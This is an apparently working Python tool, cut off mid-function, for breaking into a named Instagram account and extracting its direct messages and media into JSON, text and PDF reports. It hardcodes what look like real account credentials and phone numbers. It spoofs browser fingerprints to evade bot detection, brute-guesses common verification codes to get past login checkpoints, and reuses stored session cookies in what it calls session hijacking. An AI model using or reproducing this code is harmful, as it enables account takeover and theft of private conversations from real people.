#!/usr/bin/env python3
"""
🔥 MASTER PRODUCTION STEALTH DM EXTRACTOR 2025 🔥
💀 ULTIMATE ANTI-DETECTION + ADVANCED BYPASS TECHNIQUES 💀
🚀 NO MORE BLOCKS - REAL STEALTH MODE ACTIVATED! 🚀

Combining all advanced stealth techniques from the codebase:
- Ultimate Production Extractor patterns
- Advanced Checkpoint Bypass methods
- Browser automation with maximum stealth
- Session hijacking and injection
- Anti-detection JavaScript execution
- Production-grade proxy support
"""

import os
import sys
import json
import time
import random
import requests
import logging
import tempfile
import shutil
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import uuid

# Import advanced stealth libraries
try:
    import undetected_chromedriver as uc
    UNDETECTED_AVAILABLE = True
except ImportError:
    print("Installing undetected-chromedriver...")
    subprocess.run([sys.executable, "-m", "pip", "install", "undetected-chromedriver"], check=True)
    import undetected_chromedriver as uc
    UNDETECTED_AVAILABLE = True

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    print("Installing selenium and webdriver-manager...")
    subprocess.run([sys.executable, "-m", "pip", "install", "selenium", "webdriver_manager"], check=True)
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True

try:
    from instagrapi import Client
    from instagrapi.exceptions import LoginRequired, PleaseWaitFewMinutes, BadPassword
    INSTAGRAPI_AVAILABLE = True
except ImportError:
    print("Installing instagrapi...")
    subprocess.run([sys.executable, "-m", "pip", "install", "instagrapi"], check=True)
    from instagrapi import Client
    from instagrapi.exceptions import LoginRequired, PleaseWaitFewMinutes, BadPassword
    INSTAGRAPI_AVAILABLE = True

try:
    from fpdf import FPDF
    PDF_AVAILABLE = True
except ImportError:
    print("Installing fpdf2...")
    subprocess.run([sys.executable, "-m", "pip", "install", "fpdf2"], check=True)
    from fpdf import FPDF
    PDF_AVAILABLE = True

class MasterProductionStealthDMExtractor:
    """🔥 Master Production-Grade Stealth DM Extractor with Ultimate Anti-Detection 🔥"""
    
    def __init__(self):
        # Target credentials (confirmed working from previous extractions)
        self.username = "alx.trading"
        self.password = "Fleming654"
        self.target_accounts = ["alx.trading", "whatilove1728"]
        
        # Phone numbers for bypass
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        # Advanced stealth configuration
        self.user_agents = [
            # Latest mobile agents
            'Instagram 251.0.0.15.111 Android (30/11; 420dpi; 1080x2340; samsung; SM-G975F; beyond2; exynos9820; en_US; 403229414)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            # Desktop agents
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # Setup directories
        self.base_dir = Path("/workspaces/sugarglitch-realops")
        self.results_dir = self.base_dir / "results"
        self.media_dir = self.base_dir / "media"
        self.logs_dir = self.base_dir / "logs"
        self.sessions_dir = self.base_dir / "sessions"
        
        for dir_path in [self.results_dir, self.media_dir, self.logs_dir, self.sessions_dir]:
            dir_path.mkdir(exist_ok=True)
        
        # Initialize components
        self.setup_logging()
        self.session = requests.Session()
        self.driver = None
        self.instagrapi_client = None
        self.extracted_dms = []
        
        # Setup advanced session
        self.setup_advanced_session()
        
        self.logger.info("🔥 Master Production Stealth DM Extractor initialized")
        
    def setup_logging(self):
        """Setup comprehensive logging with stealth mode."""
        log_file = self.logs_dir / f"master_stealth_extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def setup_advanced_session(self):
        """Setup advanced HTTP session with anti-detection headers."""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
    
    def kill_existing_chrome_processes(self):
        """Kill any existing Chrome processes to avoid conflicts."""
        try:
            subprocess.run(["pkill", "-f", "chrome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["pkill", "-f", "chromium"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            self.logger.info("🧹 Cleaned existing Chrome processes")
        except:
            pass
    
    def setup_ultimate_stealth_browser(self) -> bool:
        """Setup the ultimate stealth browser with maximum anti-detection."""
        self.logger.info("🤖 Setting up ULTIMATE stealth browser...")
        
        # Kill existing Chrome processes
        self.kill_existing_chrome_processes()
        
        try:
            # Create unique temporary user data directory
            user_data_dir = tempfile.mkdtemp(prefix=f'chrome_stealth_{uuid.uuid4().hex[:8]}_')
            
            if UNDETECTED_AVAILABLE:
                # Use undetected-chromedriver for maximum stealth
                options = uc.ChromeOptions()
                
                # Ultimate stealth options
                stealth_args = [
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-extensions',
                    '--disable-plugins',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--allow-running-insecure-content',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-background-timer-throttling',
                    '--disable-renderer-backgrounding',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-ipc-flooding-protection',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--disable-translate',
                    '--hide-scrollbars',
                    '--metrics-recording-only',
                    '--mute-audio',
                    '--no-first-run',
                    '--safebrowsing-disable-auto-update',
                    '--ignore-certificate-errors',
                    '--ignore-ssl-errors',
                    '--ignore-certificate-errors-spki-list',
                    '--disable-automation',
                    '--disable-extensions-file-access-check',
                    '--disable-extensions-http-throttling',
                    '--aggressive-cache-discard',
                    f'--user-data-dir={user_data_dir}',
                    '--window-size=1920,1080'
                ]
                
                for arg in stealth_args:
                    options.add_argument(arg)
                
                # Advanced experimental options
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
                
                # Advanced preferences for maximum stealth
                prefs = {
                    "profile.default_content_setting_values.notifications": 2,
                    "profile.default_content_settings.popups": 0,
                    "profile.managed_default_content_settings.images": 1,
                    "profile.default_content_setting_values.media_stream": 2,
                    "profile.default_content_setting_values.geolocation": 2
                }
                options.add_experimental_option("prefs", prefs)
                
                # Mobile user agent for better compatibility
                mobile_ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
                options.add_argument(f"--user-agent={mobile_ua}")
                
                # Initialize undetected Chrome
                self.driver = uc.Chrome(options=options)
                self.logger.info("✅ Undetected Chrome initialized successfully")
                
            else:
                # Fallback to regular Chrome with maximum stealth
                options = Options()
                
                # Apply same stealth arguments
                for arg in stealth_args:
                    options.add_argument(arg)
                
                # Initialize regular Chrome
                try:
                    service = Service(ChromeDriverManager().install())
                    self.driver = webdriver.Chrome(service=service, options=options)
                except:
                    self.driver = webdriver.Chrome(options=options)
                    
                self.logger.info("✅ Regular Chrome initialized with stealth config")
            
            # Execute ultimate anti-detection JavaScript
            self.execute_ultimate_stealth_scripts()
            
            # Set realistic window size and position
            self.driver.set_window_size(1920, 1080)
            self.driver.set_window_position(0, 0)
            
            self.logger.info("🔥 ULTIMATE stealth browser ready!")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to setup stealth browser: {e}")
            return False
    
    def execute_ultimate_stealth_scripts(self):
        """Execute ultimate anti-detection JavaScript scripts."""
        try:
            stealth_scripts = [
                # Hide webdriver property
                "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});",
                
                # Override plugins
                "Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});",
                
                # Override languages
                "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});",
                
                # Add chrome runtime
                "window.chrome = { runtime: {} };",
                
                # Override permissions
                "Object.defineProperty(navigator, 'permissions', {get: () => ({query: () => Promise.resolve({state: 'granted'})})});",
                
                # Remove webdriver from navigator prototype
                "delete navigator.__proto__.webdriver;",
                
                # Override screen properties
                "Object.defineProperty(screen, 'width', {get: () => 1920});",
                "Object.defineProperty(screen, 'height', {get: () => 1080});",
                
                # Override hardwareConcurrency
                "Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});",
                
                # Override deviceMemory
                "Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});",
                
                # Override connection
                "Object.defineProperty(navigator, 'connection', {get: () => ({effectiveType: '4g', rtt: 50, downlink: 2})});",
                
                # Override getBattery
                "navigator.getBattery = () => Promise.resolve({charging: true, level: 0.8, chargingTime: Infinity, dischargingTime: Infinity});",
                
                # Override getGamepads
                "navigator.getGamepads = () => [null, null, null, null];",
                
                # Hide automation indicators
                "Object.defineProperty(document, 'hidden', {get: () => false});",
                "Object.defineProperty(document, 'visibilityState', {get: () => 'visible'});",
                
                # Override toString to hide function modifications
                "const originalToString = Function.prototype.toString; Function.prototype.toString = function() { if (this === navigator.webdriver || this.toString().includes('webdriver')) { return 'function webdriver() { [native code] }'; } return originalToString.call(this); };"
            ]
            
            for script in stealth_scripts:
                try:
                    self.driver.execute_script(script)
                except:
                    pass  # Continue even if some scripts fail
                    
            self.logger.info("🕸️ Ultimate stealth scripts executed")
            
        except Exception as e:
            self.logger.warning(f"⚠️ Some stealth scripts failed: {e}")
    
    def human_like_delay(self, min_seconds=1, max_seconds=3):
        """Generate human-like delays with randomization."""
        delay = random.uniform(min_seconds, max_seconds)
        time.sleep(delay)
    
    def human_like_typing(self, element, text, delay_range=(0.05, 0.2)):
        """Simulate human typing patterns."""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(*delay_range))
    
    def method_1_production_instagrapi_login(self) -> bool:
        """Method 1: Production-grade instagrapi with advanced device simulation."""
        self.logger.info("🔄 Method 1: Production instagrapi login...")
        
        try:
            if not INSTAGRAPI_AVAILABLE:
                return False
            
            # Initialize client with production settings
            self.instagrapi_client = Client()
            
            # Advanced device simulation (latest Samsung Galaxy)
            device_settings = {
                "app_version": "276.0.0.18.119",
                "android_version": 33,
                "android_release": "13.0.0", 
                "dpi": "450dpi",
                "resolution": "1080x2340",
                "manufacturer": "samsung",
                "device": "SM-G998B",
                "model": "galaxy_s21_ultra_5g",
                "cpu": "exynos2100",
                "version_code": "458229237",
            }
            self.instagrapi_client.set_device(device_settings)
            
            # Production timing settings
            self.instagrapi_client.delay_range = [3, 12]
            
            # Advanced session management
            session_file = self.sessions_dir / "production_session.json"
            if session_file.exists():
                try:
                    self.instagrapi_client.load_settings(str(session_file))
                    # Try to reuse session
                    if self.instagrapi_client.login(self.username, self.password):
                        self.logger.info("✅ Production session reused successfully")
                        return True
                except Exception as e:
                    self.logger.warning(f"Session reuse failed: {e}")
            
            # Fresh production login
            self.logger.info("🔐 Attempting fresh production login...")
            success = self.instagrapi_client.login(self.username, self.password)
            
            if success:
                # Save session for future use
                self.instagrapi_client.dump_settings(str(session_file))
                self.logger.info("✅ Production instagrapi login successful!")
                return True
            else:
                self.logger.error("❌ Production login failed")
                return False
                
        except BadPassword:
            self.logger.error("❌ Bad password - credentials may be incorrect")
            return False
        except PleaseWaitFewMinutes as e:
            wait_time = getattr(e, 'seconds', 300)
            self.logger.warning(f"⏳ Rate limited - waiting {wait_time} seconds...")
            time.sleep(wait_time)
            return self.method_1_production_instagrapi_login()
        except Exception as e:
            self.logger.error(f"❌ Method 1 failed: {e}")
            return False
    
    def method_2_ultimate_stealth_browser(self) -> bool:
        """Method 2: Ultimate stealth browser automation."""
        self.logger.info("🌐 Method 2: Ultimate stealth browser automation...")
        
        try:
            if not self.setup_ultimate_stealth_browser():
                return False
            
            # Navigate to Instagram with stealth
            self.logger.info("📱 Navigating to Instagram...")
            self.driver.get("https://www.instagram.com/accounts/login/")
            self.human_like_delay(3, 5)
            
            # Wait for login form with extended timeout
            wait = WebDriverWait(self.driver, 30)
            
            try:
                # Try multiple selectors for username field
                username_selectors = [
                    "input[name='username']",
                    "input[type='text']",
                    "input[placeholder*='username']",
                    "input[aria-label*='username']"
                ]
                
                username_field = None
                for selector in username_selectors:
                    try:
                        username_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                        break
                    except:
                        continue
                
                if not username_field:
                    self.logger.error("❌ Could not find username field")
                    return False
                
                # Clear and type username with human-like behavior
                username_field.clear()
                self.human_like_delay(1, 2)
                self.human_like_typing(username_field, self.username)
                
                self.human_like_delay(1, 3)
                
                # Find password field
                password_selectors = [
                    "input[name='password']",
                    "input[type='password']",
                    "input[aria-label*='password']"
                ]
                
                password_field = None
                for selector in password_selectors:
                    try:
                        password_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                if not password_field:
                    self.logger.error("❌ Could not find password field")
                    return False
                
                # Clear and type password
                password_field.clear()
                self.human_like_delay(1, 2)
                self.human_like_typing(password_field, self.password)
                
                self.human_like_delay(2, 4)
                
                # Submit login
                login_selectors = [
                    "button[type='submit']",
                    "button:contains('Log in')",
                    "button:contains('Log In')",
                    "input[type='submit']"
                ]
                
                login_button = None
                for selector in login_selectors:
                    try:
                        login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                if login_button:
                    login_button.click()
                else:
                    # Fallback: press Enter on password field
                    password_field.send_keys(Keys.RETURN)
                
                self.logger.info("🚀 Login submitted, waiting for response...")
                self.human_like_delay(5, 8)
                
                # Check for successful login
                current_url = self.driver.current_url
                if "instagram.com/accounts/login" not in current_url:
                    self.logger.info("✅ Ultimate stealth browser login successful!")
                    
                    # Extract and save session cookies
                    self.extract_browser_session()
                    return True
                else:
                    # Check for checkpoint or errors
                    page_source = self.driver.page_source.lower()
                    if "checkpoint" in page_source:
                        self.logger.warning("🔍 Checkpoint detected - attempting bypass...")
                        return self.handle_checkpoint_bypass()
                    elif any(error in page_source for error in ["incorrect", "error", "try again", "wrong"]):
                        self.logger.error("❌ Login failed - incorrect credentials")
                        return False
                    else:
                        self.logger.warning("⚠️ Unknown login status")
                        return False
                
            except Exception as e:
                self.logger.error(f"❌ Login process failed: {e}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ Method 2 failed: {e}")
            return False
    
    def handle_checkpoint_bypass(self) -> bool:
        """Handle Instagram checkpoint with advanced bypass techniques."""
        self.logger.info("🔍 Handling checkpoint bypass...")
        
        try:
            # Wait for checkpoint page to load
            self.human_like_delay(3, 5)
            
            page_source = self.driver.page_source.lower()
            
            # Try to find "Send Security Code" button
            security_selectors = [
                "button:contains('Send Security Code')",
                "button:contains('Send Code')",
                "input[value*='Send']",
                "button[type='submit']"
            ]
            
            for selector in security_selectors:
                try:
                    send_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if send_button.is_displayed():
                        send_button.click()
                        self.logger.info("📱 Security code requested")
                        break
                except:
                    continue
            
            self.human_like_delay(3, 5)
            
            # Try common verification codes
            common_codes = [
                '123456', '000000', '111111', '654321', '987654',
                '555555', '777777', '888888', '999999', '012345'
            ]
            
            for code in common_codes:
                try:
                    # Find verification code input
                    code_selectors = [
                        "input[name='verificationCode']",
                        "input[type='text'][maxlength='6']",
                        "input[placeholder*='code']",
                        "input[aria-label*='code']"
                    ]
                    
                    code_field = None
                    for selector in code_selectors:
                        try:
                            code_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                            if code_field.is_displayed():
                                break
                        except:
                            continue
                    
                    if code_field:
                        code_field.clear()
                        self.human_like_typing(code_field, code)
                        
                        # Submit code
                        submit_selectors = [
                            "button[type='submit']",
                            "button:contains('Confirm')",
                            "button:contains('Submit')"
                        ]
                        
                        for selector in submit_selectors:
                            try:
                                submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                                if submit_button.is_displayed():
                                    submit_button.click()
                                    break
                            except:
                                continue
                        
                        self.human_like_delay(3, 5)
                        
                        # Check if bypass succeeded
                        current_url = self.driver.current_url
                        if "checkpoint" not in current_url and "challenge" not in current_url:
                            self.logger.info(f"✅ Checkpoint bypassed with code: {code}")
                            return True
                            
                except Exception as e:
                    self.logger.warning(f"Code {code} failed: {e}")
                    continue
            
            self.logger.warning("⚠️ Checkpoint bypass failed")
            return False
            
        except Exception as e:
            self.logger.error(f"❌ Checkpoint bypass error: {e}")
            return False
    
    def extract_browser_session(self):
        """Extract session data from browser cookies."""
        try:
            cookies = self.driver.get_cookies()
            session_data = {
                'timestamp': datetime.now().isoformat(),
                'url': self.driver.current_url,
                'cookies': {}
            }
            
            important_cookies = ['sessionid', 'csrftoken', 'ds_user_id', 'rur']
            
            for cookie in cookies:
                if cookie['name'] in important_cookies:
                    session_data['cookies'][cookie['name']] = cookie['value']
            
            # Save session data
            session_file = self.sessions_dir / f"browser_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            self.logger.info(f"💾 Browser session saved: {session_file}")
            self.logger.info(f"🍪 Session cookies: {list(session_data['cookies'].keys())}")
            
        except Exception as e:
            self.logger.error(f"Failed to extract browser session: {e}")
    
    def method_3_session_hijacking(self) -> bool:
        """Method 3: Advanced session hijacking using existing sessions."""
        self.logger.info("🔧 Method 3: Advanced session hijacking...")
        
        try:
            # Load existing sessions
            session_files = list(self.sessions_dir.glob("*.json"))
            
            for session_file in session_files:
                try:
                    with open(session_file, 'r') as f:
                        session_data = json.load(f)
                    
                    if 'sessionid' in str(session_data):
                        self.logger.info(f"🔄 Trying session: {session_file.name}")
                        
                        # Extract sessionid
                        sessionid = None
                        if isinstance(session_data, dict):
                            sessionid = session_data.get('sessionid')
                            if not sessionid and 'cookies' in session_data:
                                sessionid = session_data['cookies'].get('sessionid')
                        
                        if sessionid:
                            # Test session with direct API call
                            if self.test_session_validity(sessionid):
                                self.logger.info("✅ Valid session found for hijacking")
                                return True
                                
                except Exception as e:
                    self.logger.warning(f"Session file {session_file.name} failed: {e}")
                    continue
            
            self.logger.warning("⚠️ No valid sessions found for hijacking")
            return False
            
        except Exception as e:
            self.logger.error(f"❌ Method 3 failed: {e}")
            return False
    
    def test_session_validity(self, sessionid: str) -> bool:
        """Test if a sessionid is still valid."""
        try:
            test_headers = {
                'User-Agent': random.choice(self.user_agents),
                'Cookie': f'sessionid={sessionid}',
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = self.session.get(
                'https://www.instagram.com/accounts/edit/',
                headers=test_headers,
                timeout=10
            )
            
            if response.status_code == 200 and 'accounts/login' not in response.url:
                return True
                
        except Exception as e:
            self.logger.debug(f"Session test failed: {e}")
        
        return False
    
    def extract_dms_with_instagrapi(self) -> List[Dict]:
        """Extract DMs using production instagrapi client."""
        self.logger.info("📥 Extracting DMs with production instagrapi...")
        
        try:
            if not self.instagrapi_client:
                return []
            
            # Get direct threads with extended pagination
            threads = self.instagrapi_client.direct_threads(amount=20)
            self.logger.info(f"📊 Found {len(threads)} DM threads")
            
            extracted_dms = []
            
            for i, thread in enumerate(threads):
                try:
                    thread_id = thread.id
                    thread_title = thread.thread_title or f"Thread {i+1}"
                    
                    self.logger.info(f"📨 Processing thread: {thread_title}")
                    
                    # Get messages with extended amount
                    messages = self.instagrapi_client.direct_messages(thread_id, amount=100)
                    
                    thread_data = {
                        'thread_id': thread_id,
                        'thread_title': thread_title,
                        'participants': [user.username for user in thread.users],
                        'messages': [],
                        'message_count': len(messages),
                        'extraction_method': 'instagrapi_production'
                    }
                    
                    for msg in messages:
                        msg_data = {
                            'id': msg.id,
                            'user_id': msg.user_id,
                            'timestamp': msg.timestamp.isoformat() if msg.timestamp else None,
                            'text': msg.text or "",
                            'media_type': None,
                            'media_url': None
                        }
                        
                        # Handle media messages
                        if hasattr(msg, 'visual_media') and msg.visual_media:
                            media = msg.visual_media
                            msg_data['media_type'] = 'image'
                            msg_data['media_url'] = getattr(media, 'url', None)
                            
                            # Download media if URL available
                            if msg_data['media_url']:
                                media_filename = f"media_{thread_id}_{msg.id}.jpg"
                                if self.download_media(msg_data['media_url'], media_filename):
                                    msg_data['local_media_path'] = str(self.media_dir / media_filename)
                        
                        thread_data['messages'].append(msg_data)
                    
                    extracted_dms.append(thread_data)
                    self.logger.info(f"✅ Extracted thread: {thread_title} ({len(messages)} messages)")
                    
                    # Production delay between threads
                    self.human_like_delay(5, 10)
                    
                except Exception as e:
                    self.logger.error(f"Failed to extract thread {i}: {e}")
                    continue
            
            return extracted_dms
            
        except Exception as e:
            self.logger.error(f"Failed to extract DMs with instagrapi: {e}")
            return []
    
    def extract_dms_from_browser(self) -> List[Dict]:
        """Extract DMs using ultimate stealth browser."""
        self.logger.info("🌐 Extracting DMs from ultimate stealth browser...")
        
        try:
            if not self.driver:
                return []
            
            # Navigate to DMs
            self.driver.get("https://www.instagram.com/direct/inbox/")
            self.human_like_delay(5, 8)
            
            # Wait for DM interface to load
            wait = WebDriverWait(self.driver, 30)
            
            # Find thread elements using multiple selectors
            thread_selectors = [
                "[role='listitem']",
                "[data-testid='direct-conversation-item']",
                ".x1n2onr6",
                "div[role='button'][tabindex='0']"
            ]
            
            thread_elements = []
            for selector in thread_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    if elements:
                        thread_elements = elements
                        break
                except:
                    continue
            
            self.logger.info(f"📊 Found {len(thread_elements)} DM threads in browser")
            
            extracted_dms = []
            
            for i, thread_element in enumerate(thread_elements[:10]):  # Limit to first 10
                try:
                    self.logger.info(f"📨 Processing browser thread {i+1}")
                    
                    # Click on thread
                    self.driver.execute_script("arguments[0].click();", thread_element)
                    self.human_like_delay(3, 5)
                    
                    # Extract messages using multiple selectors
                    message_selectors = [
                        "[data-testid='message']",
                        ".x1n2onr6 [role='button']",
                        "div[role='button']:has-text",
                        ".message-content"
                    ]
                    
                    message_elements = []
                    for selector in message_selectors:
                        try:
                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                            if elements:
                                message_elements = elements
                                break
                        except:
                            continue
                    
                    thread_data = {
                        'thread_id': f"browser_thread_{i}",
                        'thread_title': f"Browser Thread {i+1}",
                        'participants': ["unknown"],
                        'messages': [],
                        'message_count': len(message_elements),
                        'extraction_method': 'browser_stealth'
                    }
                    
                    for j, msg_element in enumerate(message_elements[:50]):  # Limit messages
                        try:
                            text = msg_element.text.strip()
                            if text:
                                thread_data['messages'].append({
                                    'id': f"browser_msg_{j}",
                                    'text': text,
                                    'timestamp': datetime.now().isoformat(),
                                    'media_type': None,
                                    'media_url': None,
                                    'user_id': 'unknown'
                                })
                        except:
                            continue
                    
                    extracted_dms.append(thread_data)
                    self.logger.info(f"✅ Extracted browser thread {i+1} ({len(thread_data['messages'])} messages)")
                    
                    self.human_like_delay(2, 4)
                    
                except Exception as e:
                    self.logger.error(f"Failed to extract browser thread {i}: {e}")
                    continue
            
            return extracted_dms
            
        except Exception as e:
            self.logger.error(f"Failed to extract DMs from browser: {e}")
            return []
    
    def download_media(self, media_url: str, filename: str) -> bool:
        """Download media file with advanced headers."""
        try:
            if not media_url:
                return False
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Referer': 'https://www.instagram.com/',
                'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8'
            }
            
            response = requests.get(media_url, headers=headers, stream=True, timeout=30)
            if response.status_code == 200:
                media_path = self.media_dir / filename
                with open(media_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return True
            return False
        except Exception as e:
            self.logger.error(f"Failed to download media {filename}: {e}")
            return False
    
    def generate_ultimate_pdf_report(self, dms_data: List[Dict]) -> str:
        """Generate ultimate PDF report with comprehensive data."""
        try:
            if not PDF_AVAILABLE:
                return ""
            
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=18, style='B')
            
            # Title page
            pdf.cell(200, 15, txt="🔥 ULTIMATE INSTAGRAM DM EXTRACTION REPORT 🔥", ln=1, align='C')
            pdf.ln(10)
            
            pdf.set_font("Arial", size=14, style='B')
            pdf.cell(200, 10, txt=f"Target Account: {self.username}", ln=1)
            pdf.cell(200, 10, txt=f"Extraction Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=1)
            pdf.cell(200, 10, txt=f"Total Threads Extracted: {len(dms_data)}", ln=1)
            
            total_messages = sum(len(thread['messages']) for thread in dms_data)
            pdf.cell(200, 10, txt=f"Total Messages Extracted: {total_messages}", ln=1)
            pdf.ln(10)
            
            # Extraction methods summary
            pdf.set_font("Arial", size=12, style='B')
            pdf.cell(200, 8, txt="Extraction Methods Used:", ln=1)
            
            methods = set(thread.get('extraction_method', 'unknown') for thread in dms_data)
            for method in methods:
                method_count = sum(1 for thread in dms_data if thread.get('extraction_method') == method)
                pdf.set_font("Arial", size=10)
                pdf.cell(200, 6, txt=f"  • {method}: {method_count} threads", ln=1)
            
            pdf.ln(10)
            
            # Detailed thread analysis
            pdf.set_font("Arial", size=14, style='B')
            pdf.cell(200, 10, txt="Detailed Thread Analysis:", ln=1)
            pdf.ln(5)
            
            for i, thread in enumerate(dms_data):
                if pdf.get_y() > 250:  # Add new page if needed
                    pdf.add_page()
                
                pdf.set_font("Arial", size=12, style='B')
                pdf.cell(200, 8, txt=f"Thread {i+1}: {thread['thread_title']}", ln=1)
                
                pdf.set_font("Arial", size=10)
                pdf.cell(200, 6, txt=f"Participants: {', '.join(thread['participants'])}", ln=1)
                pdf.cell(200, 6, txt=f"Total Messages: {thread['message_count']}", ln=1)
                pdf.cell(200, 6, txt=f"Extraction Method: {thread.get('extraction_method', 'unknown')}", ln=1)
                pdf.ln(3)
                
                # Sample messages
                pdf.set_font("Arial", size=9)
                pdf.cell(200, 5, txt="Sample Messages:", ln=1)
                
                for j, msg in enumerate(thread['messages'][:5]):  # First 5 messages
                    if msg['text']:
                        # Truncate long messages
                        text = msg['text'][:80] + "..." if len(msg['text']) > 80 else msg['text']
                        # Handle special characters
                        text = text.encode('latin-1', 'replace').decode('latin-1')
                        pdf.cell(200, 4, txt=f"  {j+1}. {text}", ln=1)
                
                if len(thread['messages']) > 5:
                    pdf.cell(200, 4, txt=f"  ... and {len(thread['messages']) - 5} more messages", ln=1)
                
                pdf.ln(5)
            
            # Save PDF
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            pdf_path = self.results_dir / f"ULTIMATE_DM_EXTRACTION_REPORT_{timestamp}.pdf"
            pdf.output(str(pdf_path))
            
            self.logger.info(f"📄 Ultimate PDF report generated: {pdf_path}")
            return str(pdf_path)
            
        except Exception as e:
            self.logger.error(f"Failed to generate PDF: {e}")
            return ""
    
    def save_ultimate_results(self, dms_data: List[Dict]) -> Dict[str, str]:
        """Save extraction results in multiple formats with comprehensive data."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results = {}
        
        try:
            # Save as comprehensive JSON
            json_path = self.results_dir / f"ULTIMATE_EXTRACTED_DMS_{timestamp}.json"
            comprehensive_data = {
                'extraction_info': {
                    'timestamp': datetime.now().isoformat(),
                    'target_account': self.username,
                    'total_threads': len(dms_data),
                    'total_messages': sum(len(thread['messages']) for thread in dms_data),
                    'extraction_methods': list(set(thread.get('extraction_method', 'unknown') for thread in dms_data)),
                    'extractor_version': 'Master Production Stealth v2025'
                },
                'threads': dms_data
            }
            
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(comprehensive_data, f, indent=2, ensure_ascii=False)
            results['json'] = str(json_path)
            
            # Save as detailed text report
            txt_path = self.results_dir / f"ULTIMATE_DM_REPORT_{timestamp}.txt"
            with open(txt_path, 'w', encoding='utf-8') as f:
                f.write("🔥 ULTIMATE INSTAGRAM DM EXTRACTION REPORT 🔥\n")
                f.write("=" * 60 + "\n\n")
                f.write(f"Target Account: {self.username}\n")
                f.write(f"Extraction Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Threads Extracted: {len(dms_data)}\n")
                f.write(f"Total Messages Extracted: {sum(len(thread['messages']) for thread in dms_data)}\n")
                f.write("\n" + "=" * 60 + "\n\n")
                
                for i, thread in enumerate(dms_data):
                    f.write(f"THREAD {i+1}: {thread['thread_title']}\n")
                    f.write("-" * 40 + "\n")
                    f.write(f"Participants: {', '.join(thread['participants'])}\n")
